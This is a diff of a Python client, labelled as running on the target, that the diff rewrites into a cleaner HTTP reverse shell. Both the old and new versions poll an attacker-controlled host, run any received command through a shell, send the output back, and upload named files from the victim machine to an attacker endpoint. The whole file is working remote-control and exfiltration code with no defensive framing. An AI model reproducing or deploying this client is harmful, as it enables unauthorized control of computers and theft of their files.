@@ -1,32 +1,55 @@
-#Client
+#Client ---> runs on target
 
-import requests     #Library to be installed and imported
-import subprocess 
+from urllib import request, parse
+import requests
+import subprocess
 import time
 import os
 
-while True: 
+ATTACKER_IP = '127.0.0.1' # change this to the attacker's IP address
+ATTACKER_PORT = 8080
 
-    req = requests.get('http://10.10.10.100')      # Send GET request to host machine
-    command = req.text                             # Store the received txt into command variable
+# data = parse.urlencode(<your data dict>).encode()
+# req =  request.Request(<your url>, data=data) # this will make the method "POST"
+# resp = request.urlopen(req)
+
+def send_file(command):
+    try:
+        grab, path = command.strip().split(' ')
+    except ValueError:
+        requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', \
+                      data='[-] Invalid grab command (maybe multiple spaces)')
+        return
+
+    if not os.path.exists(path):
+        requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', \
+                      data='[-] Not able to find the file' )
+        return
+
+    url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/store' # Posts to /store
+    files = {'file': open(path, 'rb')}
+    requests.post(url, files=files)
+    #requests library use POST method called "multipart/form-data"
+
+
+def run_command(command):
+    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', data=CMD.stdout.read() )
+    requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', data=CMD.stderr.read() )
+
+
+while True:
+    command = request.urlopen(f"http://{ATTACKER_IP}:{ATTACKER_PORT}").read().decode()
 
     if 'terminate' in command:
-        break 
+        break
 
-    elif 'grab' in command:
-        grab,path=command.split('*')
+    # Send file
+    if 'grab' in command:
+        send_file(command)
+        continue
 
-        if os.path.exists(path):
-            url='http://192.168.158.128/store'   #Append /store in the URL
-            files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
-            r=requests.post(url, files=files) # Send the file
-            #requests library use POST method called "multipart/form-data"
-        else:
-            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !' )
-    else:
-        CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
-        post_response = requests.post(url='http://192.168.158.128', data=CMD.stdout.read() ) 
-        post_response = requests.post(url='http://192.168.158.128', data=CMD.stderr.read() )  
-    time.sleep(3)
+    run_command(command)
+    time.sleep(1)
 
-    
+
